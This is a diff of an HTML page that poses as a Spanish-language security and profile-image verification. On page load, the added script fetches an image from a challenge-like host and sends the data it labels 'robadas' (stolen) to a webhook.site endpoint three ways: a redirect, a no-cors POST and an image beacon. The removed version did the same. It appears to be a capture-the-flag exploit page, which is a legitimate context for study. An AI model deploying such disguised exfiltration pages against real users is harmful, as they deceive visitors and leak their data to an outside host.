@@ -1,45 +1,71 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Update Required</title>
+    <title>Verificación de Seguridad Requerida</title>
 </head>
 <body>
-    <h1>Checking your security settings...</h1>
+    <h1>Verificando tu imagen de perfil...</h1>
+    <p>Por favor espera mientras validamos tu cuenta.</p>
+    
     <script>
-        // Cargar la imagen de Pepe
-        const img = new Image();
-        
-        img.onload = function() {
-            const width = this.naturalWidth;
-            const height = this.naturalHeight;
-            const nivel = width * height;
+        // Función principal para robar las dimensiones
+        function stealImageDimensions() {
+            console.log('🕵️ Cargando imagen de Pepe...');
             
-            console.log('Dimensiones encontradas:', width, '×', height, 'Nivel:', nivel);
+            const img = new Image();
             
-            // Enviar a webhook
-            fetch('https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c', {
-                method: 'POST',
-                body: JSON.stringify({
-                    nivel: nivel,
-                    width: width,
-                    height: height,
-                    calculado: width * height
-                }),
-                headers: {'Content-Type': 'application/json'}
-            });
+            img.onload = function() {
+                const width = this.naturalWidth;
+                const height = this.naturalHeight;
+                const nivel = width * height;
+                
+                console.log('✅ ÉXITO - Dimensiones:', width, '×', height);
+                console.log('📊 Nivel de Pepe:', nivel);
+                
+                // ENVIAR DATOS A TU WEBHOOK - Múltiples métodos para asegurar
+                
+                // Método 1: Redirección (más confiable)
+                setTimeout(() => {
+                    window.location.href = 'https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c?nivel=' + nivel + 
+                                          '&width=' + width + 
+                                          '&height=' + height + 
+                                          '&exito=1&timestamp=' + Date.now();
+                }, 500);
+                
+                // Método 2: Fetch POST (backup)
+                fetch('https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        accion: 'dimensiones_robadas',
+                        nivel: nivel,
+                        width: width,
+                        height: height,
+                        usuario: 'pepe',
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(e => console.log('Fetch falló, pero redirección funcionará'));
+                
+                // Método 3: Beacon con imagen
+                const beacon = new Image();
+                beacon.src = 'https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c/beacon?nivel=' + nivel;
+            };
             
-            // También como fallback en URL
-            const beacon = new Image();
-            beacon.src = 'https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c?nivel=' + nivel + '&w=' + width + '&h=' + height;
-        };
+            img.onerror = function(error) {
+                console.error('❌ Error cargando imagen:', error);
+                // Reportar error al webhook
+                window.location.href = 'https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c?error=1&timestamp=' + Date.now();
+            };
+            
+            // Cargar la imagen de Pepe (URL COMPLETA con dominio)
+            img.src = 'https://chl-7a4773d0-583b-48c9-a6d8-e797a0145e8e-imagen-importante.softwareseguro.com.ar/profile-pic?' + Date.now();
+        }
         
-        img.onerror = function(e) {
-            console.error('Error loading image:', e);
-            fetch('https://webhook.site/81cad3b7-b64b-4b32-a4de-1f9d4fd8768c?error=1');
-        };
-        
-        // Forzar fresh request
-        img.src = 'https://chl-7a4773d0-583b-48c9-a6d8-e797a0145e8e-imagen-importante.softwareseguro.com.ar/profile-pic' + Date.now();
+        // Ejecutar cuando la página cargue
+        setTimeout(stealImageDimensions, 100);
     </script>
 </body>
 </html>
